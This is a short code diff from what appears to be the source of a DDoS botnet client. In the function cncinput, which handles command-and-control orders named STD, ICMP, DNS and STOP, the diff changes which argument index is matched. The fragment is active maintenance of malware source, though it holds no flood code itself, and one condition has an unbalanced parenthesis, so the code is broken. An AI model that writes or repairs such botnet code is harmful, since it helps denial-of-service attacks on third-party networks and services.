@@ -947,7 +947,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                         return;
                 }
 }
-	if(!strcmp(argv[1], "STD"))
+	if(!strcmp(argv[0], "STD"))
         {
             if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1))
             {
@@ -979,7 +979,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                 }
  
         }
-     if(!strcmp(argv[1], "ICMP"))
+     if(!strcmp(argv[0], "ICMP"))
         {
             if(argc < 4 || atoi(argv[3]) < 1)
             {
@@ -1010,7 +1010,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                 }
  
         }
-     if(!strcmp(argv[1], "DNS"))
+     if(!strcmp(argv[0], "DNS"))
         {
             if(argc < 4 || atoi(argv[3]) < 1)
             {
@@ -1041,7 +1041,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                 }
  
         }
-    if(!strcmp(argv[1], "STOP"))
+    if(!strcmp(argv[0], "STOP"))
     {
         int killed = 0;
         unsigned long i;
